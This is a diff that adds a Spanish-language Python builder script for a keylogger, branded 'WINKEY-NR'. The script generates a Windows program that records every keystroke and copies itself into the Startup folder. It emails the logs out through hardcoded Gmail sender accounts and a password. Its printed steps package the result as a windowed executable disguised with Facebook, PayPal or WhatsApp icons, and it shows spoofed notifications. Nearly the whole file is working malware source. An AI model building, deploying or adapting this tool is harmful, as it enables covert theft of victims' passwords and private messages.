@@ -1,0 +1,332 @@
+import subprocess, time, random
+
+lista_correos = [
+     "clonrisks932024@gmail.com", "clonrisks494529@gmail.com",
+     "clonrisks788743@gmail.com", "clonrisks352355@gmail.com", 
+     "clonrisks253204@gmail.com"]
+
+nombre, icono, correo_seleccionado, clave_correos = "", "", "", ""
+titulo_notf, cuerpo_notf, url_notf = "", "", ""
+nombrePY = ""
+
+def banner_bienvenida():
+  print("")
+  print("     ssssssssssssssssssss          WINKEY-NR")       
+  print("    ssssssssssssssssssssss=============▌")
+  print("   ssssssssssssssssssssssss ")
+  print("  ssssssssssssssssssssssssss")
+  print("  ssssssssssssssssssssssssss")
+  print(" sssss       ssss       sssss            NOT-RISKS")
+  print("sssss   NOT   ss  RISKS  sssss===============▌ ")
+  print(" sssss       ssss       sssss ")
+  print("  ssssssssssssssssssssssssss")
+  print("  sssss ssss ssss ssss sssss")
+  print("  ssss   ss   ss   ss   ssss")
+  print("  ssss   ss   ss   ss   ssss         t.me/not_risks_ofc")
+  print("  sssss ssss ssss ssss sssss=================▌ ")
+  print("   ssssssssssssssssssssssss")
+  print("     ssssssssssssssssssss")
+  print("")
+
+def generar_correo_aleatorio():
+  global correo_seleccionado
+  indice_lista_correos = random.randint(0, len(lista_correos)-1)
+  correo_seleccionado = lista_correos[indice_lista_correos]
+
+def componetes_keylogger():
+  global nombre, icono, correo 
+  print("\n============================================")
+  print(" Estructure los componentes de su Keylogger ")
+  print("============================================")
+  print("---------[ICONOS DISPONIBLES]----------")
+  print("  [01]-Facebook       [09]-Instagram")
+  print("  [02]-Twitter        [10]-WhatsApp")
+  print("  [03]-Netflix        [11]-Mega")
+  print("  [04]-Twitch         [12]-Télegram")
+  print("  [05]-Pinterest      [13]-Paypal")
+  print("  [06]-Youtube        [14]-Tiktok")
+  print("  [07]-Keylogger      [15]-Mesagger")
+  print("  [08]-Spotify        [16]-Snapchat")
+  print("---------------------------------------")
+  icono = input("[Icono]>> ")
+  print("---------[NOMBRE DEL Keylogger]--------")
+  nombre = input("[Nombre]>> ")
+  print("------[Direción de correo(gmail)]------")
+  correo = input("[Correo]>> ")
+
+def componentes_notificacion():
+  global titulo_notf, cuerpo_notf, url_notf
+  print("\n===============================================")
+  print(" Estructure los componentes de su Notificacion ")
+  print("===============================================")
+  print("---------[TITULO DE LA NOTIFICACION]-----------")
+  titulo_notf = input("[TÍTULO]>> ")
+  print("---------[CUERPO DE LA NOTIFICACION]-----------")
+  cuerpo_notf = input("[CUERPO]>> ")
+  print("-----------[URL DE LA NOTIFICACION]------------")
+  url_notf = input("[URL]>> ")
+
+
+def crear_keylogger():
+  global nombre, nombrePY
+
+  nombrePY = nombre + ".py"
+  
+  archivo = open(nombrePY, "a")
+  archivo.write('from pynput.keyboard import Listener\nfrom email.mime.base import MIMEBase\n')
+  archivo.write('from email.mime.multipart import MIMEMultipart\nimport datetime, time, webbrowser, win10toast_click, smtplib, shutil, getpass, os\n\n')
+  archivo.write('contador_1, contador_2 = 0, 150\n')
+  archivo.write('usuario = getpass.getuser()\n')
+  archivo.write('validar_notificacion_abierta = False\n')
+  archivo.write('nombre_archivo = datetime.datetime.now().strftime("actualizacion-registro-pulsaciones_%d-%m-%y_%H-%M.txt")\n')
+  archivo.write('fichero = open(f"C:/Users/{usuario}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nombre_archivo}", "a+")\n\n')
+  archivo.write('if os.path.isfile("C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programas/Startup/')
+  archivo.write(f'{nombre}.exe".format(usuario)) == False:\n')
+  archivo.write(f'\tshutil.copy("{nombre}.exe", ')
+  archivo.write('"C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programas/Startup".format(usuario))\n')
+  archivo.write('else:')
+  archivo.write('\tpass\n\n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('#     Enviar correo con el archivo de las pulsaciones adjunto\n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('def enviar_correo():\n')
+  archivo.write(f'\tcorreo_remitente, clave = "{correo_seleccionado}", "backs1222"\n')
+  archivo.write('\tcorreo_receptor = "%s"' % correo)
+  archivo.write('\n\tarchivo = f"C:/Users/{usuario}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nombre_archivo}"\n')
+  archivo.write('\tmensaje = MIMEMultipart("palin")\n\n')
+  archivo.write('\tmensaje["From"]=correo_remitente\n')
+  archivo.write('\tmensaje["To"]=correo_receptor\n')
+  archivo.write('\tmensaje["Subject"]="Keylogger"\n\n')
+  archivo.write('\tadjunto = MIMEBase("aplication", "octect-stream")\n')
+  archivo.write('\tadjunto.set_payload(open(archivo, "rb").read())\n')
+  archivo.write('\tadjunto.add_header("content-Disposition", f"attachment; filename={archivo}")\n')
+  archivo.write('\tmensaje.attach(adjunto)\n')
+  archivo.write('\tmensaje = mensaje.as_string()\n\n')
+  archivo.write('\ttry:\n')
+  archivo.write('\t\tserver = smtplib.SMTP("smtp.gmail.com", 587)\n')
+  archivo.write('\t\tserver.starttls()\n')
+  archivo.write('\t\tserver.login(correo_remitente, clave)\n')
+  archivo.write('\t\tserver.sendmail(correo_remitente, correo_receptor, mensaje)\n\n')
+  archivo.write('\texcept:\n')
+  archivo.write('\t\tpass\n\n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('#             Abrir url al precionar la notificacion\n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('def abrir_url():\n')
+  archivo.write('\tglobal validar_notificacion_abierta\n')
+  archivo.write(f'\turl_notificacion = "{url_notf}"\n')
+  archivo.write('\twebbrowser.open(url_notificacion)\n')
+  archivo.write('\tfichero.write("\\n*******************************/ SE ABRIO LA NOTIFICACION /******************************\\n\\n")\n')
+  archivo.write('\tfichero.seek(len(fichero.read()))\n')
+  archivo.write('\tvalidar_notificacion_abierta = True\n\n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('#                       Mostrar notificacion \n')
+  archivo.write('# ==================================================================\n')
+  archivo.write('def mostrar_notificacion():\n')
+  archivo.write('\tnotificacion = win10toast_click.ToastNotifier()\n')
+  archivo.write(f'\ttitulo_notificacion = "{titulo_notf}"\n')
+  archivo.write(f'\ttexto_notificacion = "{cuerpo_notf}"\n')
+  archivo.write('\tnotificacion.show_toast(titulo_notificacion, texto_notificacion, icon_path="notification.ico", callback_on_click=abrir_url)\n\n')
+  archivo.write('# =======================================================================\n')
+  archivo.write('#   Leer las pulsaciones(key), convertirlas y guardarlas en el fichero\n')
+  archivo.write('# =======================================================================\n')
+  archivo.write('def leer_key(key):\n')
+  archivo.write('\tglobal contador_1, contador_2\n\n')
+  archivo.write('\tcontador_1 += 1\n\n')
+  archivo.write('\tkey = str(key)\n\n')
+  archivo.write('\t# ---Convertir las etiquetas y codigos ACSSI de las teclas a palabras mejores comprendibles---\n')
+  archivo.write('\tif key == "Key.backspace":\n')
+  archivo.write('\t\tkey = "*BORRAR*"\n\n')
+  archivo.write('\telif key == "Key.menu":\n')
+  archivo.write('\t\tkey = "*MENU*"\n\n')
+  archivo.write('\telif key == "Key.enter":\n')
+  archivo.write('\t\tkey = "*ENTER*"\n\n')
+  archivo.write('\telif key == "Key.space":\n')
+  archivo.write('\t\tkey = "*ESPACIO*"\n\n')
+  archivo.write('\telif key == "Key.esc": \n')
+  archivo.write('\t\tkey = "*ESCAPE*"\n\n')
+  archivo.write('\telif key == "Key.caps_lock":\n')
+  archivo.write('\t\tkey = "*MAYUSCULA*"\n\n')
+  archivo.write('\telif key == "Key.tab":\n')
+  archivo.write('\t\tkey = "*TABULACION*"\n\n')
+  archivo.write('\telif key == "Key.delete":\n')
+  archivo.write('\t\tkey = "*DELETE*"\n\n')
+  archivo.write('\t# ---------shift_izquierdo, shift_derecho---------------\n')
+  archivo.write('\telif key == "Key.shift": \n')
+  archivo.write('\t\tkey = "*SHIFT_IZQUIERDO*"\n\n')
+  archivo.write('\telif key == "Key.shift_r":\n')
+  archivo.write('\t\tkey = "*SHIFT_DERECHO*"\n\n')
+  archivo.write('\t# ------------control_izquierdo, control_derecho------------\n')
+  archivo.write('\telif key == "Key.ctrl_l" or key == "Key.ctrl":\n')
+  archivo.write('\t\tkey = "*CONTROL_IZQUIERDO*"\n\n')
+  archivo.write('\telif key == "Key.ctrl_r":\n')
+  archivo.write('\t\tkey = "*CONTROL_DERECHO*"\n\n')
+  archivo.write('\t# -------------windows_izquierdo, windows_derecho-----------\n')
+  archivo.write('\telif key == "Key.cmd":\n')
+  archivo.write('\t\tkey = "*WINDOWS_IZQUIERDO*"\n\n')
+  archivo.write('\telif key == "Key.cmd_r":\n')
+  archivo.write('\t\tkey = "*WINDOWS_DERECHO*"\n\n')
+  archivo.write('\t# -------------alt_izquierdo, alt_derecho----------------\n')
+  archivo.write('\telif key == "Key.alt_l" or key == "Key.alt":\n')
+  archivo.write('\t\tkey = " *ALT_IZQUIERDO*"\n\n')
+  archivo.write('\telif key == "Key.alt_gr" or key == "Key.alt_r":\n')
+  archivo.write('\t\tkey = " *ALT_DERECHO*"\n\n')
+  archivo.write('\t# ---------teclado numerico(1,2,3,4,5,6,7,8,9,0, NumLock)---------\n')
+  archivo.write('\telif key == "Key.num_lock": \n')
+  archivo.write('\t\tkey = "*TECLADO_NUMERICO*"\n\n')
+  archivo.write('\telif key == "<96>":\n')
+  archivo.write('\t\tkey = "0"\n\n')
+  archivo.write('\telif key == "<97>":\n')
+  archivo.write('\t\tkey = "1"\n\n')
+  archivo.write('\telif key == "<98>":\n')
+  archivo.write('\t\tkey = "2"\n\n')
+  archivo.write('\telif key == "<99>":\n')
+  archivo.write('\t\tkey = "3"\n\n')
+  archivo.write('\telif key == "<100>":\n')
+  archivo.write('\t\tkey = "4"\n\n')
+  archivo.write('\telif key == "<101>" or key == "<65437>":\n')
+  archivo.write('\t\tkey = "5"\n\n')
+  archivo.write('\telif key == "<102>":\n')
+  archivo.write('\t\tkey = "6"\n\n')
+  archivo.write('\telif key == "<103>":\n')
+  archivo.write('\t\tkey = "7"\n\n')
+  archivo.write('\telif key == "<104>":\n')
+  archivo.write('\t\tkey = "8"\n\n')
+  archivo.write('\telif key == "<105>":\n')
+  archivo.write('\t\tkey = "9"\n\n')
+  archivo.write('\t# --------(F1,F2,F3,F4,F5,F6,F7,F8,F9,F10,F11,F12,)-------\n')
+  archivo.write('\telif key == "Key.f1":\n')
+  archivo.write('\t\tkey = "*F1*"\n\n')
+  archivo.write('\telif key == "Key.f2":\n')
+  archivo.write('\t\tkey = "*F2*"\n\n')
+  archivo.write('\telif key == "Key.f3":\n')
+  archivo.write('\t\tkey = "*F3*"\n\n')
+  archivo.write('\telif key == "Key.f4":\n')
+  archivo.write('\t\tkey = "*F4*"\n\n')
+  archivo.write('\telif key == "Key.f5":\n')
+  archivo.write('\t\tkey = "*F5*"\n\n')
+  archivo.write('\telif key == "Key.f6":\n')
+  archivo.write('\t\tkey = "*F6*"\n\n')
+  archivo.write('\telif key == "Key.f7":\n')
+  archivo.write('\t\tkey = "*F7*"\n\n')
+  archivo.write('\telif key == "Key.f8":\n')
+  archivo.write('\t\tkey = "*F8*"\n\n')
+  archivo.write('\telif key == "Key.f9":\n')
+  archivo.write('\t\tkey = "*F9*"\n\n')
+  archivo.write('\telif key == "Key.f10":\n')
+  archivo.write('\t\tkey = "*F10*"\n\n')
+  archivo.write('\telif key == "Key.f11":\n')
+  archivo.write('\t\tkey = "*F11*"\n\n')
+  archivo.write('\telif key == "Key.f12":\n')
+  archivo.write('\t\tkey = "*F12*"\n\n')
+  archivo.write('\t# ------Flechas(left, down, up, right)-------\n')
+  archivo.write('\telif key == "Key.up": \n')
+  archivo.write('\t\tkey = "*FLECHA_ARRIBA*"\n\n')
+  archivo.write('\telif key == "Key.down":\n')
+  archivo.write('\t\tkey = "*FLECHA_ABAJO*"\n\n')
+  archivo.write('\telif key == "Key.left":\n')
+  archivo.write('\t\tkey = "*FLECHA_IZQUIERDA*"\n\n')
+  archivo.write('\telif key == "Key.right":\n')
+  archivo.write('\t\tkey = "*FLECHA_DERECHA*"\n\n')
+  archivo.write('\t# -------(a,b,c,d,e,f,g,h,i,j,k,m,n,o,p,q,r,s,t,u,v,w,x,y,z)-------\n')
+  archivo.write('\telse:\n')
+  archivo.write("""\t\tkey = key.replace("'", "")\n\n""")
+  archivo.write('\thora = datetime.datetime.now().strftime("%H:%M:%S")\n\n')
+  archivo.write('\tif contador_1 == contador_2:\n')
+  archivo.write('\t\tmostrar_notificacion()\n')
+  archivo.write('\t\tenviar_correo()\n')
+  archivo.write('\t\tcontador_2 += 150\n')
+  archivo.write('\telse:\n')
+  archivo.write('\t\tpass\n\n')
+  archivo.write('\tif validar_notificacion_abierta:\n')
+  archivo.write('\t# guardando pulsaciones dentro del fichero.txt\n')
+  archivo.write('\t\tfichero.write(f"===================/{contador_1}/====================\\n")\n')
+  archivo.write('\t\tfichero.write("Pulsacion:       " + key + "\\n")\n')
+  archivo.write('\t\tfichero.write("Hora:            " + hora + "\\n")\n')
+  archivo.write('\t\tfichero.write("Notificacion:    Ya fue abierta\\n")\n')
+  archivo.write('\t\tfichero.seek(len(fichero.read()))\n\n')
+  archivo.write('\telse:\n')
+  archivo.write('\t\t# guardando pulsaciones dentro del fichero.txt\n')
+  archivo.write('\t\tfichero.write(f"===================/{contador_1}/====================\\n")\n')
+  archivo.write('\t\tfichero.write("Pulsacion:       " + key + "\\n")\n')
+  archivo.write('\t\tfichero.write("Hora:            " + hora + "\\n")\n')
+  archivo.write('\t\tfichero.write("Notificacion:    Aun no se ha abierto\\n")\n')
+  archivo.write('\t\tfichero.seek(len(fichero.read()))\n\n')
+  archivo.write('with Listener(on_press=leer_key) as l:\n')
+  archivo.write('\tl.join()')
+  archivo.close()
+  del archivo
+
+  if icono == "01" or icono == "1":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/facebook_icon.ico" (nombre del archivo)')
+
+  elif icono == "02" or icono == "2":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/twitter_icon.ico" (nombre del archivo)')
+  
+  elif icono == "03" or icono == "3":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/netflix_icon.ico" (nombre del archivo)')
+  
+  elif icono == "04" or icono == "4":
+    url_notificacion = "https://twitch.tv"
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/twitch_icon.ico" (nombre del archivo)')
+
+  elif icono == "05" or icono == "5":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/pinterest_icon.ico" (nombre del archivo)')
+
+  elif icono == "06" or icono == "6":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/youtube_icon.ico" (nombre del archivo)')
+
+  elif icono == "07" or icono == "7":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/keylogger_icon.ico" (nombre del archivo)')
+
+  elif icono == "08" or icono == "8":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/spotify_icon.ico" (nombre del archivo)')
+
+  elif icono == "09" or icono == "9":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/instagram_icon.ico" (nombre del archivo)')
+
+  elif icono == "10":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/whatsapp_icon.ico" (nombre del archivo)')
+
+  elif icono == "11":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/mega_icon.ico" (nombre del archivo)')
+
+  elif icono == "12":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/telegram_icon.ico" (nombre del archivo)')
+
+  elif icono == "13":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/paypal_icon.ico" (nombre del archivo)')
+
+  elif icono == "14":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/tiktok_icon.ico" (nombre del archivo)')
+
+  elif icono == "15":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/messager_icon.ico" (nombre del archivo)')
+
+  elif icono == "16":
+    print('[!] AVISO [!]\nPara generar el archivo ejecutble debe de instalar la libreria pyinstaller, para ello dirijase a su consola y use el comando...\npip install pyinstaller')
+    print('Luego de aver instaldo la libreria se mueve en la consola hacia la ubicacion del archivo (.py) y ejecuta el siguiente comando...\npyinstaller --windowed --clean --onefile --icon="icons/snapchat_icon.ico" (nombre del archivo)')
+
+banner_bienvenida()
+componetes_keylogger()
+componentes_notificacion()
+print(icono)
+generar_correo_aleatorio()
+crear_keylogger()
+
+print("Por ultimo se ingresa a la carpeta dist y se obtiene el ejecutable")
